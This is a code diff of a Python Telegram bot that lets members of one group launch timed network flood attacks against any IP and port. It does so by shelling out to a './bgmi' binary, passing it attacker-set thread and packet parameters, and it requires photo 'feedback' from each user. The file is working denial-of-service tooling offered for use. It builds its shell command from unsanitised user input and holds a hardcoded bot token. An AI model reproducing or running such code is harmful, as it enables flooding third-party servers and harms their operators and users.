@@ -1,13 +1,7 @@
-import os
 import asyncio
 import logging
-import time
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
-
-# Suppress HTTP request logs
-logging.getLogger("httpx").setLevel(logging.WARNING)
-logging.getLogger("telegram").setLevel(logging.WARNING)
+from telegram import Update  # Import Update class
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext  # Import CallbackContext
 
 # Logging Configuration
 logging.basicConfig(
@@ -18,109 +12,110 @@ logging.basicConfig(
 # Bot Configuration
 TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'  # Replace with your bot token
 OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
-ALLOWED_GROUP_ID = -1002380705719  # Replace with your allowed group ID
-MAX_THREADS = 2000  # Default max threads
-max_duration = 240  # Default max attack duration
-daily_attack_limit = 8
+ALLOWED_GROUP_ID = -1002491572572  # Replace with your allowed group ID
+
+# Attack Settings
+MAX_THREADS = 20  # Maximum threads limit
+max_duration = 30  # Maximum attack duration
+daily_attack_limit = 15
+
+# Default Attack Parameters
+DEFAULT_THREADS = 100
+DEFAULT_PACKET_SIZE = 8
+DEFAULT_PACKETS_PER_THREAD = 10
 
 # Attack & Feedback System
+attack_running = False
 user_attacks = {}
 feedback_waiting = {}
 attack_ban_list = {}
 
-# Global attack lock (timestamp when the current attack finishes)
-global_attack_lock = 0  
-
-# Check if bot is used in the allowed group
 def is_allowed_group(update: Update):
+    """Check if the command is executed in the allowed group."""
     chat = update.effective_chat
     return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID
 
-# Start Command
 async def start(update: Update, context: CallbackContext):
+    """Handle the /start command."""
     if not is_allowed_group(update):
         return
 
     user_id = update.effective_user.id
     if user_id not in user_attacks:
-        user_attacks[user_id] = daily_attack_limit
-
-    message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration> <threads>*\n\n"
-        f"⚔️ *You have {user_attacks[user_id]} attacks left today!* ⚔️\n\n"
-        "*💥 Let the war begin!*"
-    )
-
-    await update.message.reply_text(text=message, parse_mode='Markdown')
-
-# Attack Command
-async def attack(update: Update, context: CallbackContext):
-    global global_attack_lock
-    if not is_allowed_group(update):
-        return
-
-    user_id = update.effective_user.id
-
-    if user_id in attack_ban_list:
-        await update.message.reply_text("❌ *You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
-        return
-
-    current_time = time.time()
-    if current_time < global_attack_lock:
-        await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
-        return
-
-    if user_id not in user_attacks:
-        user_attacks[user_id] = daily_attack_limit
-
-    if user_attacks[user_id] <= 0:
-        await update.message.reply_text("❌ *You have used all your daily attacks!*", parse_mode='Markdown')
-        return
-
-    args = context.args
-    if len(args) != 4:
-        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
-        return
-
-    ip, port, duration, threads = args
-    duration = int(duration)
-    threads = int(threads)
-
-    if duration > max_duration:
-        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
-        return
-
-    if threads > MAX_THREADS:
-        await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
-        return
-
-    # Set global attack lock
-    global_attack_lock = current_time + duration
-
-    user_attacks[user_id] -= 1
-    remaining_attacks = user_attacks[user_id]
-
-    feedback_waiting[user_id] = True
+        user_attacks[user_id] = daily_attack_limit  # Initialize attack count for new users
 
     await update.message.reply_text(
-        f"⚔️ *Attack Started!*\n"
-        f"🎯 *Target*: {ip}:{port}\n"
-        f"🕒 *Duration*: {duration} sec\n"
-        f"🧵 *Threads*: {threads}\n"
-        f"🔥 *Let the battlefield ignite! 💥*\n\n"
-        f"💥 *You have {remaining_attacks} attacks left today!*\n\n"
-        "📸 *Please send a photo feedback before the attack completes, or you will be banned for 10 minutes!*",
+        f"🔥 Welcome to the battlefield! 🔥\n\n"
+        f"Use /attack <ip> <port> <duration>\n"
+        f"⚔️ You have {user_attacks[user_id]} attacks left today!\n\n"
+        f"💥 Let the war begin!",
         parse_mode='Markdown'
     )
 
-    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context, user_id))
+async def attack(update: Update, context: CallbackContext):
+    """Handle the /attack command."""
+    global attack_running
+    if not is_allowed_group(update):
+        return
 
-# Run Attack in Background
-async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
+    user_id = update.effective_user.id
+
+    # Initialize user_attacks if not already present
+    if user_id not in user_attacks:
+        user_attacks[user_id] = daily_attack_limit
+
+    if user_id in attack_ban_list:
+        await update.message.reply_text("❌ You are banned from using /attack for 10 minutes!", parse_mode='Markdown')
+        return
+
+    if attack_running:
+        await update.message.reply_text("⚠️ Another attack is already running. Please wait!", parse_mode='Markdown')
+        return
+
+    if user_attacks[user_id] <= 0:
+        await update.message.reply_text("❌ You have used all your daily attacks!", parse_mode='Markdown')
+        return
+
+    args = context.args
+    if len(args) < 3:
+        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>", parse_mode='Markdown')
+        return
+
+    ip, port, duration = args[:3]
+    try:
+        duration = int(duration)
+    except ValueError:
+        await update.message.reply_text("❌ Invalid duration! Please provide a number.", parse_mode='Markdown')
+        return
+
+    if duration > max_duration:
+        await update.message.reply_text(f"❌ Attack duration exceeds max limit ({max_duration} sec)!", parse_mode='Markdown')
+        return
+
+    attack_running = True
+    user_attacks[user_id] -= 1  # Decrement attack count
+    feedback_waiting[user_id] = True
+
+    await update.message.reply_text(
+        f"⚔️ Attack Started!\n"
+        f"🎯 Target: {ip}:{port}\n"
+        f"🕒 Duration: {duration} sec\n"
+        f"🧵 Threads: {DEFAULT_THREADS}\n"
+        f"📦 Packet Size: {DEFAULT_PACKET_SIZE}\n"
+        f"📩 Packets per Thread: {DEFAULT_PACKETS_PER_THREAD}\n\n"
+        f"🔥 Let the battlefield ignite! 💥\n\n"
+        f"📸 Please send a photo feedback or you will be banned!",
+        parse_mode='Markdown'
+    )
+
+    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, context, user_id))
+
+async def run_attack(chat_id, ip, port, duration, context, user_id):
+    """Run the attack process."""
+    global attack_running
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration} {threads}",
+            f"./bgmi {ip} {port} {duration} {DEFAULT_THREADS} {DEFAULT_PACKET_SIZE} {DEFAULT_PACKETS_PER_THREAD}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -129,85 +124,139 @@ async def run_attack(chat_id, ip, port, duration, threads, context, user_id):
             await asyncio.wait_for(process.communicate(), timeout=duration + 10)
         except asyncio.TimeoutError:
             process.kill()
-            await context.bot.send_message(chat_id=chat_id, text="⚠️ *Attack process timed out!*", parse_mode='Markdown')
+            await context.bot.send_message(chat_id=chat_id, text="⚠️ Attack process timed out!", parse_mode='Markdown')
 
     except Exception as e:
         logging.error(f"Error during attack: {e}")
-        await context.bot.send_message(chat_id=chat_id, text="❌ *An error occurred during the attack!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="❌ An error occurred during the attack!", parse_mode='Markdown')
 
     finally:
-        if feedback_waiting.get(user_id):
-            await context.bot.send_message(chat_id=chat_id, text=f"❌ *You didn't send feedback! You are banned from using the attack command for 10 minutes!*", parse_mode='Markdown')
+        attack_running = False
+        if feedback_waiting.pop(user_id, False):
+            await context.bot.send_message(chat_id=chat_id, text="❌ You didn't send feedback! Banned for 10 minutes!", parse_mode='Markdown')
             attack_ban_list[user_id] = True
             asyncio.create_task(unban_user_after_delay(user_id, 600))
         else:
-            await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Finished, now next attack!*", parse_mode='Markdown')
+            await context.bot.send_message(chat_id=chat_id, text="✅ Attack Finished, now next attack!", parse_mode='Markdown')
 
-# Unban user after delay
 async def unban_user_after_delay(user_id, delay):
+    """Unban a user after a delay."""
     await asyncio.sleep(delay)
     attack_ban_list.pop(user_id, None)
 
-# Handle Photo Feedback
 async def handle_photo(update: Update, context: CallbackContext):
+    """Handle photo feedback."""
     user_id = update.effective_user.id
-    if user_id in feedback_waiting:
-        del feedback_waiting[user_id]
-        await update.message.reply_text("✅ *Thanks for your feedback!*", parse_mode='Markdown')
+    if feedback_waiting.pop(user_id, False):
+        await update.message.reply_text("✅ Thanks for your feedback!", parse_mode='Markdown')
 
-# Reset User Attacks
 async def reset_attacks(update: Update, context: CallbackContext):
+    """Handle the /resetattacks command."""
+    logging.info("reset_attacks command received")
     if update.effective_user.username != OWNER_USERNAME:
-        await update.message.reply_text("❌ *Only the owner can reset attacks!*", parse_mode='Markdown')
+        logging.warning("Unauthorized user attempted to reset attacks")
         return
 
     for user_id in user_attacks:
         user_attacks[user_id] = daily_attack_limit
 
-    await update.message.reply_text(f"✅ *All users' attack limits have been reset to {daily_attack_limit}!*")
+    await update.message.reply_text(f"✅ All users' attack limits have been reset!", parse_mode='Markdown')
 
-# Set Maximum Attack Duration
-async def set_duration(update: Update, context: CallbackContext):
-    global max_duration
+async def set_max_duration(update: Update, context: CallbackContext):
+    """Handle the /set_max_duration command."""
+    logging.info("set_max_duration command received")
+    try:
+        global max_duration
+        if update.effective_user.username != OWNER_USERNAME:
+            logging.warning("Unauthorized user attempted to set max duration")
+            return
 
-    if update.effective_user.username != OWNER_USERNAME:
-        await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
-        return
+        args = context.args
+        if len(args) != 1 or not args[0].isdigit():
+            await update.message.reply_text("⚠️ Usage: /set_max_duration <duration>", parse_mode='Markdown')
+            return
 
-    args = context.args
-    if len(args) != 1 or not args[0].isdigit():
-        await update.message.reply_text("⚠️ *Usage: /setduration <max_duration_sec>*", parse_mode='Markdown')
-        return
+        max_duration = int(args[0])
+        await update.message.reply_text(f"✅ Max attack duration set to {max_duration} sec!", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in set_max_duration: {e}")
+        await update.message.reply_text("❌ An error occurred while setting max duration!", parse_mode='Markdown')
 
-    max_duration = int(args[0])
-    await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*")
+async def set_default_threads(update: Update, context: CallbackContext):
+    """Handle the /set_default_threads command."""
+    logging.info("set_default_threads command received")
+    try:
+        global DEFAULT_THREADS
+        if update.effective_user.username != OWNER_USERNAME:
+            logging.warning("Unauthorized user attempted to set default threads")
+            return
 
-# Set Maximum Threads
-async def set_threads(update: Update, context: CallbackContext):
-    global MAX_THREADS
+        args = context.args
+        if len(args) != 1 or not args[0].isdigit():
+            await update.message.reply_text("⚠️ Usage: /set_default_threads <threads>", parse_mode='Markdown')
+            return
 
-    if update.effective_user.username != OWNER_USERNAME:
-        await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
-        return
+        DEFAULT_THREADS = int(args[0])
+        await update.message.reply_text(f"✅ Default threads set to {DEFAULT_THREADS}!", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in set_default_threads: {e}")
+        await update.message.reply_text("❌ An error occurred while setting default threads!", parse_mode='Markdown')
 
-    args = context.args
-    if len(args) != 1 or not args[0].isdigit():
-        await update.message.reply_text("⚠️ *Usage: /set_threads <max_threads>*", parse_mode='Markdown')
-        return
+async def set_packet_size(update: Update, context: CallbackContext):
+    """Handle the /set_packet_size command."""
+    logging.info("set_packet_size command received")
+    try:
+        global DEFAULT_PACKET_SIZE
+        if update.effective_user.username != OWNER_USERNAME:
+            logging.warning("Unauthorized user attempted to set packet size")
+            return
 
-    MAX_THREADS = int(args[0])
-    await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*")
+        args = context.args
+        if len(args) != 1 or not args[0].isdigit():
+            await update.message.reply_text("⚠️ Usage: /set_packet_size <size>", parse_mode='Markdown')
+            return
 
-# Main Bot Setup
+        DEFAULT_PACKET_SIZE = int(args[0])
+        await update.message.reply_text(f"✅ Packet size set to {DEFAULT_PACKET_SIZE}!", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in set_packet_size: {e}")
+        await update.message.reply_text("❌ An error occurred while setting packet size!", parse_mode='Markdown')
+
+async def set_default_packets_per_thread(update: Update, context: CallbackContext):
+    """Handle the /set_default_packets_per_thread command."""
+    logging.info("set_default_packets_per_thread command received")
+    try:
+        global DEFAULT_PACKETS_PER_THREAD
+        if update.effective_user.username != OWNER_USERNAME:
+            logging.warning("Unauthorized user attempted to set default packets per thread")
+            return
+
+        args = context.args
+        if len(args) != 1 or not args[0].isdigit():
+            await update.message.reply_text("⚠️ Usage: /set_default_packets_per_thread <count>", parse_mode='Markdown')
+            return
+
+        DEFAULT_PACKETS_PER_THREAD = int(args[0])
+        await update.message.reply_text(f"✅ Default packets per thread set to {DEFAULT_PACKETS_PER_THREAD}!", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in set_default_packets_per_thread: {e}")
+        await update.message.reply_text("❌ An error occurred while setting default packets per thread!", parse_mode='Markdown')
+
 def main():
+    """Start the bot."""
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+
+    # Register command handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("resetattacks", reset_attacks))
-    application.add_handler(CommandHandler("setduration", set_duration))
-    application.add_handler(CommandHandler("set_threads", set_threads))
+    application.add_handler(CommandHandler("set_max_duration", set_max_duration))
+    application.add_handler(CommandHandler("set_default_threads", set_default_threads))
+    application.add_handler(CommandHandler("set_packet_size", set_packet_size))  # Updated command
+    application.add_handler(CommandHandler("set_default_packets_per_thread", set_default_packets_per_thread))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
 
+    # Start the bot
     application.run_polling()
 
 if __name__ == '__main__':
